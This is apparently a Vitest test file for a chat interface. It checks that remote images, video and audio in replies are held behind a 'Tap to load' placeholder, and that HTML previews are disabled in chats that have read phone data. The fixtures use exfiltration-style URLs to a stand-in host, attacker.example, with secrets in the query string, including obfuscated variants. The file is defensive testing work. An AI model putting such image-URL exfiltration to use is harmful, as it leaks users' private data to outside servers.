// @vitest-environment happy-dom
// A remote image, video or audio in a reply waits for a tap in every chat, not only after a phone_data read.
import { act } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import { afterEach, beforeAll, describe, expect, test } from 'vitest'
import { Media } from './components/Media'
import { Markdown } from './components/Markdown'

beforeAll(() => {
  ;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
})

// Every root is unmounted after each test, so no React work is left to run after happy-dom tears the window down.
const roots: Root[] = []
afterEach(async () => {
  await act(async () => roots.splice(0).forEach(r => r.unmount()))
  document.body.replaceChildren()
})

async function draw(src: string) {
  const host = document.createElement('div')
  document.body.append(host)
  const root = createRoot(host)
  roots.push(root)
  await act(async () => root.render(<Media src={src} alt="x" />))
  return host
}

describe('Media in a chat that has read no phone data', () => {
  test('a remote image is not fetched until a tap', async () => {
    const host = await draw('https://attacker.example/p.png?d=SECRET')
    expect(host.querySelector('img')).toBeNull()
    const hold = host.querySelector('button.remote-hold') as HTMLButtonElement
    expect(hold.textContent).toContain('attacker.example')
    expect(hold.textContent).toContain('has data in the address')
    expect(hold.textContent).toContain('Tap to load')
    await act(async () => hold.click())
    expect(host.querySelector('button.remote-hold')).toBeNull()
    expect(host.querySelector('img')?.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET')
  })

  test('http, protocol-relative and spaced-out addresses wait too', async () => {
    for (const src of ['http://attacker.example/p.gif', '//attacker.example/p.png', 'ht\ttps://attacker.example/p.png']) {
      const host = await draw(src)
      expect(host.querySelector('img'), src).toBeNull()
      expect(host.querySelector('.remote-hold'), src).not.toBeNull()
    }
  })

  test('a remote video or audio is held with "Tap to open"', async () => {
    for (const src of ['https://attacker.example/v.mp4', 'https://attacker.example/a.mp3']) {
      const host = await draw(src)
      expect(host.querySelector('video, audio, .audio-player'), src).toBeNull()
      expect(host.querySelector('.remote-hold')?.textContent, src).toContain('Tap to open')
    }
  })

  test('a data: image loads by itself, and a blob: address is not held', async () => {
    const data = 'data:image/png;base64,AAAA'
    const host = await draw(data)
    expect(host.querySelector('.remote-hold')).toBeNull()
    expect(host.querySelector('img')?.getAttribute('src')).toBe(data)
    // A blob: address has no file ending, so it shows as a file chip, not an image; what matters is that it is not held.
    expect((await draw('blob:https://app.example/1234')).querySelector('.remote-hold')).toBeNull()
  })

  test('a pointer drag (scrolling) across the placeholder does not load the image', async () => {
    const src = 'https://attacker.example/p.png?d=T09'
    const host = await draw(src)
    const hold = host.querySelector('button.remote-hold') as HTMLButtonElement
    await act(async () => {
      hold.dispatchEvent(new PointerEvent('pointerdown', { pointerId: 1, clientX: 50, clientY: 200, bubbles: true }))
      hold.dispatchEvent(new PointerEvent('pointermove', { pointerId: 1, clientX: 50, clientY: 240, bubbles: true }))
      hold.dispatchEvent(new PointerEvent('pointerup', { pointerId: 1, clientX: 50, clientY: 240, bubbles: true }))
      hold.click()
    })
    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('.file-chip')).toBeNull()
    expect(host.querySelector('button.remote-hold')?.textContent).toContain('has data in the address')
    expect(host.querySelector('button.remote-hold')?.textContent).toContain('Tap to load')
  })

  test('a failed remote image load returns to the hold placeholder instead of becoming a file chip', async () => {
    const src = 'https://attacker.example/missing.png?d=T09'
    const host = await draw(src)
    await act(async () => (host.querySelector('button.remote-hold') as HTMLButtonElement).click())
    const img = host.querySelector('img.media') as HTMLImageElement
    expect(img).not.toBeNull()
    expect(img.getAttribute('loading')).toBeNull()
    await act(async () => {
      img.dispatchEvent(new Event('error'))
    })
    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('.file-chip')).toBeNull()
    const hold = host.querySelector('button.remote-hold') as HTMLButtonElement
    expect(hold).not.toBeNull()
    expect(hold.textContent).toContain('attacker.example')
    expect(hold.textContent).toContain('has data in the address')
    expect(hold.textContent).toContain("Couldn't load · Tap to load")
  })

  test('changing src on an already-allowed Media resets the hold for the new URL', async () => {
    const host = document.createElement('div')
    document.body.append(host)
    const root = createRoot(host)
    roots.push(root)
    await act(async () => root.render(<Media src="https://a.example/1.png" alt="a" />))
    await act(async () => (host.querySelector('button.remote-hold') as HTMLButtonElement).click())
    expect(host.querySelector('img')?.getAttribute('src')).toBe('https://a.example/1.png')
    await act(async () => root.render(<Media src="https://b.example/2.png?d=SECRET" alt="b" />))
    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('button.remote-hold')?.textContent).toContain('b.example')
    expect(host.querySelector('button.remote-hold')?.textContent).toContain('has data in the address')
  })
})

describe('Fenced HTML code blocks in a chat that has read phone data', () => {
  async function drawMd(text: string, guard: boolean) {
    const host = document.createElement('div')
    document.body.append(host)
    const root = createRoot(host)
    roots.push(root)
    await act(async () => root.render(<Markdown text={text} guard={guard} />))
    return host
  }

  test('a 1-line fenced html block shows the "HTML previews are off here" note and no iframe or Preview button', async () => {
    const host = await drawMd('```html\n<h1>T09</h1>\n```', true)
    expect(host.querySelector('iframe')).toBeNull()
    expect([...host.querySelectorAll('button')].some(b => b.textContent === 'Preview')).toBe(false)
    expect(host.querySelector('.html-note')?.textContent).toContain('HTML previews are off here')
    expect(host.querySelector('pre')?.textContent).toContain('<h1>T09</h1>')
  })

  test('a 3+ line fenced html block in a guarded chat hides Preview and shows the note immediately', async () => {
    const host = await drawMd('```html\n<div>\n  <h1>T09</h1>\n</div>\n```', true)
    expect(host.querySelector('iframe')).toBeNull()
    expect([...host.querySelectorAll('button')].some(b => b.textContent === 'Preview')).toBe(false)
    expect(host.querySelector('.html-note')?.textContent).toContain('HTML previews are off here')
  })

  test('control: an unguarded chat has no note on a 1-line block and offers Preview on a 3+ line html block', async () => {
    const one = await drawMd('```html\n<h1>T09</h1>\n```', false)
    expect(one.querySelector('.html-note')).toBeNull()
    const multi = await drawMd('```html\n<div>\n  <h1>T09</h1>\n</div>\n```', false)
    expect(multi.querySelector('.html-note')).toBeNull()
    expect([...multi.querySelectorAll('button')].some(b => b.textContent === 'Preview')).toBe(true)
  })
})
